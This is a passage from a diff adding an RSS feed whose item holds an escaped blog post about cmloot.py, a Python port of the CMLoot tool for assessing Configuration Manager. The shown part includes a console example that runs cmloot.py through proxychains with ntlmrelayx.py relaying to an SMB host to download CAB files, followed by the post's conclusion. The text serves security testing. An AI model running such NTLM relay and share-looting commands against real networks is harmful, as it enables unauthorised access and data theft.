+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smb://TEST\DEMOMACHINE$@100.64.5.221
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run &lt;code&gt;cmloot.py&lt;/code&gt; trough proxychains relaying through &lt;code&gt;ntlmrelayx.py&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ proxychains python3 cmloot.py TEST/DEMOMACHINE\$@100.64.5.221 -n -cmlootdownload sccmfiles.txt -extensions CAB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ProxyChains-3.1 (http://proxychains.sf.net)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-100.64.5.221:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Extensions to download [&amp;#39;CAB&amp;#39;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 1A6D-ccmsetup.cab
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;By porting the PowerShell version of &lt;code&gt;CMLoot&lt;/code&gt; to &lt;code&gt;cmloot.py&lt;/code&gt;, pentesters and
+assessors will have a more versitile tool in their arsenal which can be used
+to assess Configuration Manager from more angles and in turn help organizations
+to build up their reciliance against external threats.&lt;/p&gt;
+&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/fortra/impacket&#34;&gt;https://github.com/fortra/impacket&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
